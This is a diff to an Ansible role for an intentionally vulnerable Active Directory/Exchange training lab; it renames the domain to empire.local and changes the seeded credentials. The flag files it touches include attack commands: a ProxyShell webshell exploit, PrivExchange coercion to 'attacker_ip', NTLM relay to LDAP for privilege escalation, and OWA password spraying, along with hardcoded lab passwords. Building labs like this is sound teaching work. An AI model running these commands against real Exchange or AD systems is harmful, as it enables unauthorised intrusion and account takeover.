@@ -1,7 +1,7 @@
 ---
 # ==============================================================================
 # vuln_exchange/tasks/exchange.yml — SRV-056..080
-# Target: dc01.corp.local (AD-side Exchange stubs)
+# Target: coruscant.empire.local (AD-side Exchange stubs)
 #
 # No real Exchange is installed in this lab. This role:
 #   1. Creates Exchange-related AD groups and accounts (as a real Exchange install would)
@@ -93,11 +93,11 @@
         Affects Exchange 2013/2016/2019 pre-patch. Unauthenticated RCE.
 
         Attack:
-          python3 proxyshell.py -u https://mail.corp.local -e admin@corp.local
+          python3 proxyshell.py -u https://mail.empire.local -e admin@empire.local
           → Webshell dropped to Exchange server
 
         Note: No real Exchange in this lab — surface is educational.
-        Lab mail account: mail_admin@corp.local / MailAdmin2024!
+        Lab mail account: mail_admin@empire.local / MailAdmin2024!
 
     - path: 'C:\Flags\FLAG-SRV-059-ProxyLogon.txt'
       content: |
@@ -107,7 +107,7 @@
         CVE-2021-27065 (post-auth file write), enables unauthenticated RCE.
         CVSS: 9.8 CRITICAL
 
-        Attack surface: https://mail.corp.local/owa/
+        Attack surface: https://mail.empire.local/owa/
 
     - path: 'C:\Flags\FLAG-SRV-061-Exchange-NTLM-Relay.txt'
       content: |
@@ -118,11 +118,11 @@
         can be coerced to authenticate to an attacker.
 
         PushSubscription coercion:
-          python3 privexchange.py -ah attacker_ip mail.corp.local \
-            -u mail_admin -p MailAdmin2024! -d corp.local
+          python3 privexchange.py -ah attacker_ip mail.empire.local \
+            -u mail_admin -p MailAdmin2024! -d empire.local
 
         Relay to LDAP:
-          ntlmrelayx.py --target ldap://dc01.corp.local --escalate-user mail_admin
+          ntlmrelayx.py --target ldap://coruscant.empire.local --escalate-user mail_admin
 
     - path: 'C:\Flags\FLAG-SRV-065-OWA-Brute.txt'
       content: |
@@ -132,5 +132,5 @@
         Domain account lockout policy may differ from OWA Basic auth behavior.
 
         Tool: Ruler, o365spray, Spray-AD
-        ruler --domain corp.local --username jim.halpert --password Password123! --insecure
-        spray.py -d corp.local -u users.txt -p 'Password123!' --proto owa --host mail.corp.local
+        ruler --domain empire.local --username luke.skywalker --password SithLord123! --insecure
+        spray.py -d empire.local -u users.txt -p 'SithLord123!' --proto owa --host mail.empire.local
